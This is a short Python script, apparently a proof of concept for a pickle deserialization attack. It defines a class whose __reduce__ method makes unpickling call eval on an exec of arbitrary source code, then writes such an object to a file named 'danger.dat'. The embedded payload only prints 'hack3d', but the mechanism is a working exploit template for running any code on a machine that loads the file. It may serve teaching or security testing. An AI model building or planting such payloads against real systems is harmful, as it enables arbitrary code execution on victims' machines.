import pickle


class MaliciousInject:
    def __init__(self, src: str):
        self._src = src
    def __reduce__(self):
        return eval, (f"exec('''{self._src}''')",), None, None, None


content = MaliciousInject("print('hack3d')")
with open('danger.dat', 'wb') as f:
    pickle.dump(content, f)

